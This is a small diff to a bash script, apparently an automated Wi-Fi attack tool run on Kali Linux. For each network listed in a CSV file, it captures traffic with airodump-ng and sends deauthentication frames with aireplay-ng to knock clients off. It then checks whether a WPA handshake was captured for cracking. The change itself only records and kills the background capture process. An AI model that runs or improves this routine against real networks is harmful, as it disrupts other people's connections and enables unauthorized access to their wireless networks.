@@ -89,10 +89,12 @@ active() {
 
     iwconfig wlan1 channel $channel
     timeout 40 airodump-ng --bssid $bssid --channel $channel -w /home/kali/shakes wlan1 </dev/null >/dev/null &
+    pid=`echo $!`
     aireplay-ng -a $bssid -0 20 wlan1
     sleep 20
     checkHandshakes $1
     rm /home/kali/shakes-* >/dev/null
+    kill -9 $pid
   done </home/kali/shakesCollector-01.csv
 
 }
